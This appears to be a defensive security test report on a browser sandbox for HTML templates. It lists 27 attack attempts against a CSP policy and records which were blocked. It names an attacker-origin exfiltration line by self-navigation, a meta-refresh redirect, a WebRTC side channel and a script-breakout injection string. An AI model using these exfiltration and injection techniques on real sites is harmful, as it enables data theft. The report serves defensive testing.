# Templates library — html sandbox: adversarial browser test

**Date:** 2026-09-29 · **Branch:** `research/templates-library` · **Tester:** adversarial security pass
**Test:** `server/test/templates-sandbox-browser.test.js` (node:test, Node 20, skips cleanly with no Chromium)
**Rig:** real headless Chromium (Chrome for Testing 149, `~/.cache/ms-playwright/chromium-1228`) driven by
`puppeteer-core` (server/node_modules). Isolated server on **:3101**, attacker HTTP+WS origin on **:3199**
(overridable via `SBX_PORT` / `SBX_ATTACKER_PORT`). Malicious html templates were signed with a throwaway
Ed25519 catalog key (passed as `TEMPLATE_CATALOG_PUBLIC_KEY`) so they installed as `trust: verified`, then
`use`d in the first user's workspace (that user is `platform_admin` on self-hosted).

## Verdict

**The html-template sandbox holds.** Every attempt to read the server origin's session, exfiltrate to an
undeclared host, reach the framing player, or execute injected code **failed** in a real browser. The only
successes are the two that CSP inherently cannot prevent — a document navigating **its own** frame, and
WebRTC being outside CSP's reach — and neither hands the author anything the author was not already given
(there is no secret param type; data-source values are already-public rendered data). **No code change is
required.** Two low-severity hardening options are listed at the end.

The isolation rests on the response header
`Content-Security-Policy: sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline' data:; style-src 'unsafe-inline' data:; img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; frame-src 'none'; worker-src 'none'; manifest-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'`
(built in `lib/templates/render.js`, emitted by the render/preview/thumb routes, and NOT overwritten by
helmet's dashboard CSP thanks to the `/api/widgets/*/render` + `/api/templates/preview/` skips in `server.js`).

## Key observed evidence (top-level load of a signed malicious template)

Attacker origin seeded on `http://127.0.0.1:3101` beforehand: `localStorage.token = "FAKE-JWT"`,
`document.cookie = "st_session=FAKE-COOKIE"`. Probe result (abridged, from the browser console):

```
reads: {
  origin: "http://127.0.0.1:3101",      // location.origin reflects the URL — NOT a leak (see note)
  selfOrigin: "null",                    // the REAL security origin is opaque
  "localStorage.token": "THROW:SecurityError",
  cookie: "THROW:SecurityError",
  indexedDB: "THROW:SecurityError",
  "parent.cookie": "THROW:SecurityError",
  "parent.postMessage": "sent"           // allowed, but carries no origin/DOM access
}
throws: { eval: "THROW:EvalError", newFunction: "THROW:EvalError",
          winopen: "null", sw: "THROW:SecurityError", webrtc: "constructed", credentials: "present" }
metaInjected: true    // the 2nd <meta CSP> was appended to the DOM but had ZERO effect (fetch still blocked)
pwned: false          // hostile </script> param value did NOT break out
scriptCount: 3        // exactly the 3 legitimate scripts (st-values JSON, ST runtime, payload)

ATTACKER_HITS: []     // zero of 20 exfil channels reached the attacker origin
CSP violations fired for: script-src(eval), connect-src(fetch/xhr/beacon/ws/sse),
  default-src(prefetch), style-src-elem(css @import), font-src(@font-face), img-src(img),
  frame-src(iframe), object-src(object), worker-src(blob/data)
```

> **Note on `location.origin` vs `self.origin`.** In a `sandbox`ed (opaque-origin) document Chrome still
> returns the URL's origin string from `location.origin`; the real security origin is `self.origin`, which is
> `"null"`, and all storage access throws `SecurityError`. The test asserts on `self.origin` and the storage
> throws, not on `location.origin`. (This tripped the first draft of the test — worth remembering for anyone
> reviewing this area: `location.origin` is NOT the isolation indicator.)

## Attack → result → severity table

| # | Attack | Result | Sev | Note / fix |
|---|--------|--------|-----|------|
| 1 | Read server-origin `localStorage` (seeded fake JWT) | **BLOCKED** — `SecurityError` (opaque origin) | — | `sandbox` in CSP forces null origin even top-level |
| 2 | Read server-origin `document.cookie` | **BLOCKED** — `SecurityError` | — | same |
| 3 | Open server-origin `indexedDB` | **BLOCKED** — `SecurityError` | — | same |
| 4 | `fetch('/api/templates/library' | '/api/devices')` with credentials | **BLOCKED** — `connect-src 'none'`; also no cookies to send (opaque) | — | |
| 5 | `window.parent.document` / `window.top.location.href` (framed) | **BLOCKED** — `SecurityError` cross-origin | — | verified in the player-shape iframe (`sandbox="allow-scripts"`) |
| 6 | `window.parent.postMessage('pwn','*')` | **ALLOWED to send**, but conveys no DOM/origin access and the player must simply ignore unknown messages | Low | The player already treats widget frames as untrusted. Recommend: the player only acts on postMessage from frames it created, for a known message schema (belt-and-braces). |
| 7 | `fetch`/`XMLHttpRequest`/`sendBeacon` → undeclared host | **BLOCKED** — `connect-src 'none'`, 0 attacker hits | — | |
| 8 | `WebSocket` → undeclared host | **BLOCKED** — `connect-src` | — | |
| 9 | `EventSource` → undeclared host | **BLOCKED** — `connect-src` | — | |
| 10 | `<img src=undeclared>` | **BLOCKED** — `img-src data: blob:` only | — | |
| 11 | `<link rel=prefetch/preconnect/dns-prefetch>` undeclared | **BLOCKED** — falls to `default-src 'none'` | — | violation reported as `default-src` |
| 12 | CSS `@import url(undeclared)` | **BLOCKED** — `style-src-elem` | — | |
| 13 | `@font-face src:url(undeclared)` + use the font | **BLOCKED** — `font-src data:` only | — | |
| 14 | `<form action=undeclared>` + `submit()` | **BLOCKED** — `form-action 'none'` | — | |
| 15 | `window.open(undeclared)` | **BLOCKED** — returns `null` (no popup in the sandbox; opening navigations disallowed) | — | |
| 16 | Nested `<iframe src=undeclared>` | **BLOCKED** — `frame-src 'none'` | — | |
| 17 | `<object data=undeclared>` / `<embed>` | **BLOCKED** — `object-src 'none'` | — | |
| 18 | `navigator.serviceWorker.register(...)` | **BLOCKED** — `SecurityError` (opaque origin cannot register a SW) | — | also `worker-src 'none'` |
| 19 | `new Worker(blob:...)` / `new Worker(data:...)` | **BLOCKED** — `worker-src 'none'` | — | |
| 20 | `eval('…')` / `new Function('…')()` | **BLOCKED** — `EvalError` (no `'unsafe-eval'`; `'unsafe-inline'` does not grant eval) | — | |
| 21 | Inject a 2nd `<meta http-equiv=Content-Security-Policy>` to loosen `connect-src`/`img-src` | **NO EFFECT** — meta was appended but the header policy still blocked fetch/img (CSP only intersects; the `sandbox` header also can't be relaxed by meta) | — | |
| 22 | `import('http://undeclared/mod.js')` (remote ES module) | **BLOCKED** — `script-src 'unsafe-inline' data:` (no remote http[s]) | — | |
| 23 | Break out of `st-values` JSON via a text param value `</script><script>window.PWNED=1//` (+ U+2028) | **BLOCKED** — `scriptSafeJson` escapes `< > & U+2028/9`; `window.PWNED` unset, script count still 3, value delivered inert | — | value is validated (`params.checkValue`) AND escaped; two layers |
| 24 | `navigator.credentials` presence | present (WebAuthn API exists) but is a user-gesture/permission-gated prompt, no silent data path | Info | not an exfil channel here |
| 25 | **Self-navigation**: `location.href='http://attacker/?leaked=…'` | **SUCCEEDS (inherent)** — attacker received `/NAV?leaked=secretvalue` | Info | CSP cannot stop a document navigating its own frame; there is no `navigate-to` support to rely on. **This is by design** and already documented in `render.js` (#3): nothing secret is ever put in a template, so a template exfiltrating what it was given is not a boundary crossing. |
| 26 | **`<meta http-equiv=refresh url=http://attacker>`** | **SUCCEEDS (inherent)** — same class as #25 | Info | same reasoning |
| 27 | **WebRTC** `new RTCPeerConnection({iceServers:[stun:…]})` + `createOffer()` | **CONSTRUCTS / offer created (inherent gap)** — no attacker hit here only because no reachable STUN/TURN was provided | Low | Classic CSP blind spot: `connect-src` does not govern ICE. With a reachable TURN/STUN on an undeclared host a template could exfiltrate. See fix below. |

## CSP delivered on every render path (verified)

| Path | Status | CSP present? |
|------|--------|--------------|
| `GET /api/widgets/:id/render` (no `?rev`) | 200 | ✅ full `sandbox allow-scripts …`, `Cache-Control: no-store`, no `X-Frame-Options` |
| `GET /api/widgets/:id/render?rev=…` (cacheable) | 200 | ✅ same CSP, `Cache-Control: …immutable` |
| `POST …/preview` → `GET /api/templates/preview/:token` (valid) | 200 | ✅ `sandbox allow-scripts …`, `no-store` |
| `GET /api/templates/preview/:bogus` (expired/unknown) | 410 | ✅ `Content-Security-Policy: sandbox` on the blank page |
| `GET /api/templates/thumb/:sha` | 200 | ✅ `Content-Security-Policy: sandbox`, `nosniff` |
| widget of an **unusable** template (unsigned + policy turned off) | 200 | ✅ **black blank page**, full sandbox CSP, **no author code** (`STILL-ALIVE` absent) |
| unknown widget id | 404 | plain 404 (no document served) |

Exactly **one** CSP header is present on renders (helmet's dashboard CSP is correctly skipped for
`/api/widgets/*/render` and `/api/templates/preview/*`), so there is no weaker policy racing the strong one.

**In-use uninstall is refused (409)** with the widget list — a template backing a live widget cannot be
orphaned, and once it becomes unusable the widget renders the fenced black page rather than stale code. This
is the same code path a **revoked** template takes (`usable()` in `lib/templates/widget.js`), so revocation is
covered by the same evidence (revocation itself needs a signed catalog index and was not exercised over HTTP).

## Service-worker cached copy keeps the CSP (code review, not runtime)

`server/player/sw.js` rev-pinned branch does `cache.put(event.request, response.clone())` and later
`return cached` unchanged, so the stored `Response` retains its headers **including the CSP**. This branch is
also, per the file's own measured comment, **never reached for widget frames** today: the player mounts
widgets in an `allow-scripts` (opaque-origin) iframe, which a service worker does not control, so the render
navigation is not intercepted. Net: the SW neither weakens nor is relied upon for template isolation. No issue.
(Not runtime-verified here because exercising it needs a controlled same-origin client mounting the render via
`fetch`/`srcdoc`, which the player deliberately does not do for widgets.)

## Recommended hardening (both LOW — defense in depth, not fixes for a live escape)

1. **WebRTC (row 27).** Add `webrtc 'block'` to the html CSP in `lib/templates/render.js` `htmlCsp()`. It is
   honored by current Chromium/Blink (the player, Android WebView, BrightSign Chromium) and closes the one
   silent-exfil channel `connect-src` cannot. It is additive and safe: no template needs WebRTC. Verify on the
   oldest supported WebView; where unsupported it is simply ignored (no regression). *(Proposed change only —
   not applied; core code is another agent's to edit.)*
2. **postMessage discipline (row 6).** Confirm the web player (`server/player/index.html`) only acts on
   `message` events whose `event.source` is a widget iframe it created and whose payload matches a known
   schema, so a template cannot drive the player by posting crafted messages. This is player-side, orthogonal
   to CSP.

Neither is required for the sandbox to be sound. The build spec's own invariant — *"what a template is given,
its author can read; nothing secret is ever given"* — is upheld: the only escapes are the author carrying out
data it already had.

## How to reproduce

```
export PATH="$HOME/.nvm/versions/node/v20.20.1/bin:$PATH"
cd server && node --test --test-timeout=120000 test/templates-sandbox-browser.test.js
# no browser? it skips cleanly:            SBX_NO_BROWSER=1 node --test test/templates-sandbox-browser.test.js
# ports busy? override:                    SBX_PORT=3105 SBX_ATTACKER_PORT=3205 node --test test/…
```
